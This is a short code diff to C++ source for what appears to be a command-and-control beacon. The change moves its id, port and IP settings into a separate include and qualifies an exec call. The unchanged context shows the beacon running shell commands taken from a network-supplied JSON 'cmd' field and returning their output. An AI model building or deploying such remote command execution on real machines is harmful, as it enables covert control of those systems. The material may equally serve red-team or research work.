@@ -1,6 +1,3 @@
-int beacon_id = 0;
-int beacon_port = 8000;
-const char *beacon_ip_addr = "127.0.0.1";
 #include <iostream>
 #include <string>
 #include <tuple>
@@ -8,15 +5,17 @@ const char *beacon_ip_addr = "127.0.0.1";
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <unistd.h>
+#include <array>
 #include <cmdline.hpp>
 #include <cmds.hpp>
 #include <nlohmann/json.hpp>
 #include <include/beacon.hpp>
-#include <array>
+#include <beacon.vars>
 
 using json = nlohmann::json;
 
 Cmdline cmdline("","");
+
 
 Beacon::Beacon(int bid, int bport, const char *b_attached_to)
 {
@@ -96,7 +95,7 @@ std::string Beacon::respond(std::string buf){
     }
     /// COMMAND LINE EXECUTION GOES HERE ///
     std::string cmd = update["cmd"];
-    cout = exec(cmd.c_str());
+    cout = ::exec(cmd.c_str());
     ////////////////////////////////////////
     return set_update(status, cout, alive, persistent);
 }
